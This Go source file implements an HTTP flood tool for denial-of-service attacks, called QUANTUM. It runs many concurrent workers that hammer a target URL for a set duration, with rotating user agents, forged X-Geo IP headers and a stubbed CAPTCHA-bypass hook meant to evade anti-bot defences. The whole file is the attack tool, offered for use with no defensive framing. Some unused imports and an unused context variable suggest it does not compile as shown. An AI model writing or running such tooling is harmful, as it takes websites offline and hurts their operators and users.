package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/imroc/req/v3"
	"golang.org/x/net/proxy"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
	// Add more user-agents here
}

var headers = []string{
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"Accept-Language: en-US,en;q=0.5",
	"Connection: keep-alive",
	// Add more headers here
}

// Random string generator for IP addresses
func randomIP() string {
	b1 := randInt(1, 255)
	b2 := randInt(1, 255)
	b3 := randInt(1, 255)
	b4 := randInt(1, 255)
	return fmt.Sprintf("%d.%d.%d.%d", b1, b2, b3, b4)
}

// Generate random integer
func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

// Create a client with random user-agent, IP, and X-Geo headers
func createRequestClient(target string) *req.Client {
	client := req.C()

	// Set random user-agent
	userAgent := userAgents[randInt(0, len(userAgents)-1)]
	client.SetUserAgent(userAgent)

	// Set random X-Geo IP header
	client.SetHeader("X-Geo", fmt.Sprintf("DK, %s", randomIP()))

	// Set referer to target URL
	client.SetHeader("Referer", target)

	// Set other headers
	for _, header := range headers {
		parts := strings.Split(header, ": ")
		client.SetHeader(parts[0], parts[1])
	}

	return client
}

// CAPTCHA Bypass (Placeholder - integrate your method here)
func bypassCaptcha(target string) {
	// Placeholder: Implement a CAPTCHA bypass solution based on the tutorial
	// You can use AntiCaptcha API, 2Captcha, etc.
	fmt.Println("Attempting CAPTCHA Bypass...")
}

// Worker for sending requests
func worker(target string, duration time.Duration, ppsLimit int, wg *sync.WaitGroup) {
	defer wg.Done()
	client := createRequestClient(target)

	// Timer for limiting requests per second
	ticker := time.NewTicker(time.Second / time.Duration(ppsLimit))

	// End the loop after duration
	timeout := time.After(duration)

	for {
		select {
		case <-timeout:
			return
		case <-ticker.C:
			// Send the request to the target
			resp, err := client.R().Get(target)
			if err != nil {
				fmt.Printf("Error visiting target: %v\n", err)
				continue
			}

			// Check if CAPTCHA is triggered
			if strings.Contains(resp.String(), "captcha") {
				bypassCaptcha(target)
			}

			// Print the status code
			fmt.Printf("Visited target %s - Status: %d\n", target, resp.StatusCode)
		}
	}
}

// Main function
func main() {
	// Parse arguments
	if len(os.Args) != 5 {
		fmt.Println("Usage: go run QUANTUM.go <target> <duration> <threads> <pps limit (-1 for none)>")
		os.Exit(1)
	}

	target := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2])
	threads := atoi(os.Args[3])
	ppsLimit := atoi(os.Args[4])

	if ppsLimit == -1 {
		ppsLimit = 1000 // No limit, just a high value
	}

	// WaitGroup to manage threads
	var wg sync.WaitGroup
	wg.Add(threads)

	// Set up signal handling to terminate gracefully
	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("Received interrupt, stopping...")
		cancel()
	}()

	// Start the threads
	for i := 0; i < threads; i++ {
		go worker(target, duration, ppsLimit, &wg)
	}

	wg.Wait()
	fmt.Println("All threads completed")
}

func atoi(s string) int {
	num, _ := big.NewInt(0).SetString(s, 10)
	return int(num.Int64())
}
